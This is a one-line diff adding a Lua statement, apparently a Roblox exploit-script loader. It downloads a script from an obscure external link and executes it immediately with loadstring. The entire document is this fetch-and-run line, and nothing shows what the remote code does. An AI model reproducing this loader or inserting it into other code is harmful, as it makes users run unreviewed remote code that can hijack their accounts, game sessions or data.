@@ -1,0 +1,1 @@
+return loadstring(game:HttpGet("https://kenncpeyjyjykea.ok.kimi.link/main.lua"))()
